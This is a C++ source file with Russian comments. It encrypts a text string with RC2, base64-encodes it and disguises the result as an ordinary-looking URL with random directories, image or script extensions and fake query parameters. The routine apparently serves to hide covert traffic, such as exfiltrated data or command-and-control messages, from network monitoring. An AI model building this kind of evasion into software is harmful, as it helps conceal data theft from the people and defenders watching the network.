#include "core\core.h"
#include "core\crypt.h"
#include "core\rand.h"
#include <stdio.h>

const int CountSimpleExts = 7;
char* SimpleExts[CountSimpleExts] = { ".gif", ".jpg", ".png", ".htm", ".html", ".php", ".shtml" };
const int CountParamsExts = 3;
char* ParamsExts[CountParamsExts] = { ".php", ".bml", ".cgi" };

int CorrectlyInsert( int i, StringBuilder& s, const char* v, int c_v = -1 )
{
	while( i < s.Len() - 1 )
	{
		if( s[i - 1] != '-' && s[i - 1] != '.' && s[i] != '-' && s[i] != '.' )
		{
			s.Insert( i, v, c_v );
			return i;
		}
		i++;
	}
	return -1;
}

//возвращает позицию после вставленного расширения
int InsertDirectories( StringBuilder& s, int len )
{
	char slash[2];
	slash[0] = '/';
	slash[1] = 0;
	int slashs = Rand::Gen( 1, 4 );
	int p = 0;
	int maxDist = len / slashs; //максимально через сколько символов ставить слеш
	for( int i = 0; i < slashs && p < len; i++ )
	{
		p += Rand::Gen( 1, maxDist );
		int pp = CorrectlyInsert( p, s, slash, 1 );
		if( pp < 0 )
			break;
		p = pp + 1;
		len++;
	}
	return p;
}

int InsertExt( int i, StringBuilder& s, const char** exts, int c_exts )
{
	int ext = Rand::Gen(c_exts - 1);
	int lenExt = Str::Len( exts[ext] );
	if( i == 0 ) //вставка в конец строки
	{
		s.Cat( exts[ext], lenExt );
		return s.Len();
	}
	else
	{
		i = CorrectlyInsert( i, s, exts[ext], lenExt );
		if( i < 0 )
			i = s.Len();
		else
			i += lenExt;
		return i;
	}
}

void TextToUrl( const char* psw, const char* text, StringBuilder& url )
{
	Rand::Init();
	StringBuilder s;
	s += '|';
	s += text;
	s += '|';
	int lenleft = Rand::Gen( 10, 20 );
	int lenright = Rand::Gen( 10, 20 );
	int lenres = s.Len() + lenleft + lenright;
	//делаем длину кратной 24, чтобы делилось на 3 (для base64 без = в конце) и на 8 (длина блока в RC2)
	int lenres2 = ((lenres + 23) / 24) * 24 - 1; //вычитаем 1, после шифрования будет кратно 8
	lenleft += lenres2 - lenres;
	StringBuilder left, right;
	Rand::Gen( left, lenleft );
	Rand::Gen( right, lenright );
	s.Insert( 0, left );
	s += right;
	StringBuilder IV;
	Rand::Gen( IV, 8 );
	Mem::Data data;
	data.Copy(  s.c_str(), s.Len() );
	Crypt::EncodeRC2( psw, IV, data );
	Crypt::ToBase64( data, url );
	url.ReplaceChars( "/+", ".-" );
	url.Insert( 0, IV );
	if( Rand::Condition(50) )
	{
		int lendirs = Rand::Gen( url.Len() - 20, url.Len() - 10 ); //на какой длине могут быть директории
		InsertDirectories( url, lendirs );
		InsertExt( 0, url, (const char**)SimpleExts, CountSimpleExts );
	}
	else
	{
		int lendirs = Rand::Gen( url.Len() / 2 - 10, url.Len() / 2 + 10 ); //на какой длине могут быть директории
		int p = InsertDirectories( url, lendirs );
		if( lendirs - p > 0 )
			p = InsertExt( lendirs, url, (const char**)ParamsExts, CountParamsExts );
		char c1[2]; c1[0] = '?'; c1[1] = 0;
		p = CorrectlyInsert( p, url, c1, 1 ); //вставляем ?
		p++;
		c1[0] = '&'; //разделитель параметров
		char c2[2]; c2[0] = '='; c2[1] = 0;
		int params = Rand::Gen( 1, 4 );
		int lenparams = url.Len() - p;
		int distParam = lenparams / params;
		for( int i = 0; i < params; i++ )
		{
			int p2 = p + Rand::Gen( 1, distParam );
			int p4 = p2 + 1; //позиция следующего параметра
			if( p2 > url.Len() || i == params - 1 ) 
				p2 = url.Len();
			else
			{
				p2 = CorrectlyInsert( p2, url, c1, 1 );
				p4++;
			}
			if( p2 < 0 ) break;
			int p3 = Rand::Gen( p + 2, p2 - 1 );
			p3 = CorrectlyInsert( p3, url, c2, 1 );
			p = p4 + 1;
			if( p >= url.Len() ) break;
		}
	}
	url.Insert( 0, "http://host/" );
}
